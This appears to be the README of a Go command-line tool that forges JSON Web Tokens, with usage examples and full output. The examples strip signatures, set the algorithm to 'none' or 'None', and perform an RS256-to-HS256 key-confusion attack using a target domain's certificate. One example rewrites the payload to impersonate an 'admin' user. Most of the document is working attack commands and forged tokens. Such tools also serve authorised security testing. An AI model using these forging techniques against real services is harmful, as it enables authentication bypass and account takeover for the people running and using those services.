# jwt

`jwt` is a tool that will help maniupulate JWT tokens to perform different JWT attacks. 

# Usage example

```
▶ jwt -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"


Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.
```

If Algorithm is "RS256", it is recommended to try replacing with HS256 and generate a new signature with the SSL certificate from the current domain:

```
▶ jwt -d example.com  -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"

Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT RS256 to HS256:                    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.313062653532316538353938633561383531646539663938643063656136643761373563353663316130653832303634633435333833363165613632343961310a

JWT RS256 to HS256, RM Padding:        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.313062653532316538353938633561383531646539663938643063656136643761373563353663316130653832303634633435333833363165613632343961310a

JWT RS256 to HS256 (B64):              eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.MzEzMDYyNjUzNTMyMzE2NTM4MzUzOTM4NjMzNTYxMzgzNTMxNjQ2NTM5NjYzOTM4NjQzMDYzNjU2MTM2NjQzNzYxMzczNTYzMzUzNjYzMzE2MTMwNjUzODMyMzAzNjM0NjMzNDM1MzMzODMzMzYzMTY1NjEzNjMyMzQzOTYxMzEwYQ==

JWT RS256 to HS256 (B64), RM Padding:  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.MzEzMDYyNjUzNTMyMzE2NTM4MzUzOTM4NjMzNTYxMzgzNTMxNjQ2NTM5NjYzOTM4NjQzMDYzNjU2MTM2NjQzNzYxMzczNTYzMzUzNjYzMzE2MTMwNjUzODMyMzAzNjM0NjMzNDM1MzMzODMzMzYzMTY1NjEzNjMyMzQzOTYxMzEwYQ
```

Once you have validated that one of the above techniques work, try to update the payload:

```
▶ jwt -j '{"id":"1","username":"admin"}' -d example.com  -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"

Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

New Payload                            {"age":"27","id":"1","username":"admin"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.

JWT RS256 to HS256:                    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.643538383163666634623232643562393038323166366137643434353934666332653038633838656663353134623539373134646135303838363532643130340a

JWT RS256 to HS256, RM Padding:        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.643538383163666634623232643562393038323166366137643434353934666332653038633838656663353134623539373134646135303838363532643130340a

JWT RS256 to HS256 (B64):              eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.NjQzNTM4MzgzMTYzNjY2NjM0NjIzMjMyNjQzNTYyMzkzMDM4MzIzMTY2MzY2MTM3NjQzNDM0MzUzOTM0NjY2MzMyNjUzMDM4NjMzODM4NjU2NjYzMzUzMTM0NjIzNTM5MzczMTM0NjQ2MTM1MzAzODM4MzYzNTMyNjQzMTMwMzQwYQ==

JWT RS256 to HS256 (B64), RM Padding:  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.NjQzNTM4MzgzMTYzNjY2NjM0NjIzMjMyNjQzNTYyMzkzMDM4MzIzMTY2MzY2MTM3NjQzNDM0MzUzOTM0NjY2MzMyNjUzMDM4NjMzODM4NjU2NjYzMzUzMTM0NjIzNTM5MzczMTM0NjQ2MTM1MzAzODM4MzYzNTMyNjQzMTMwMzQwYQ
```

# Install

```
▶ go get -u github.com/NkxxkN/jwt
```